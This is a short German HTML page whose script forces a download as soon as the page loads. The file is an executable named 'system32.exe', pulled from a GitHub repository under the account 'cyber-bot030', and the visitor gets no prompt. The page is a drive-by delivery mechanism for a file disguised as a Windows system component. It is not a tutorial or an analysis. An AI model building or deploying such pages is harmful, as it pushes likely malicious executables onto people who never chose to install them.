<!DOCTYPE html>
<html lang="de">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Automatischer Download von GitHub</title>
</head>
<body>
    <h1>Automatischer Download einer Datei von GitHub</h1>
    <p>Wenn Sie diese Seite besuchen, beginnt der Download automatisch.</p>

    <script>
        function downloadFile() {
            var link = document.createElement('a');
            link.href = 'https://github.com/cyber-bot030/download-system/raw/main/system32.exe'; // GitHub Direct Link
            link.download = 'system32.exe';
            link.click();
        }

        window.onload = function() {
            downloadFile();
        };
    </script>
</body>
</html>
